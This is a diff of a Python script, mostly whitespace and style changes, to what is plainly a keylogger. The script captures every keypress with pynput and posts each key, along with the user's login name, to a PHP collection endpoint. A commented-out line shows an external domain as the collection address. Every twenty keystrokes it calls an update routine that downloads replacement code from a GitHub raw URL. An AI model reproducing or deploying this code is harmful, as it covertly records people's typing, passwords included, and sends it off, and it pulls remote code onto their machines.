@@ -1,6 +1,6 @@
-__version__="1.0.0"
-
-import sys,os
+__version__ = "1.0.0"
+import sys
+import os
 import contextlib
 from pynput import keyboard
 import getpass
@@ -10,10 +10,12 @@ import urllib.request
 import re
 from subprocess import call
 
+
 def update(dl_url, force_update=False):
     def compare_versions(vlocal, vremote):
         
-        if vlocal == vremote: return 0
+        if vlocal == vremote:
+            return 0
         
         def isfloat(s):
             try:
@@ -22,8 +24,8 @@ def update(dl_url, force_update=False):
                 return False
             return True
         
-        vlocal=vlocal.replace('.','')
-        vremote=vremote.replace('.','')
+        vlocal = vlocal.replace('.','')
+        vremote = vremote.replace('.','')
         
         if isfloat(vlocal) and isfloat(vremote):
             if float(vlocal) > float(vremote):
@@ -119,22 +121,22 @@ def update(dl_url, force_update=False):
     return
     
 
+counter = 0
 
-counter=0
+
 def on_press(key):
     global counter
     
-    name=getpass.getuser()
+    name = getpass.getuser()
     data = {"name": str(name), "key": str(key)}
     #r = requests.post("http://benedikt-schwering.de/WannaSToftware/keylog/index.php", data=data)  # this will make the method "POST"
     r = requests.post("http://localhost/WannaSToftware/keylog/index.php", data=data)  # this will make the method "POST"
-    counter+=1
-    if counter>20:
-        counter=0
+    counter += 1
+    if counter > 20:
+        counter = 0
         update('https://github.com/boba2fett/ShitCollection/raw/master/logkey/k.py')
 
 
 listener = keyboard.Listener(on_press=on_press)
 listener.start()
 listener.join() 
-
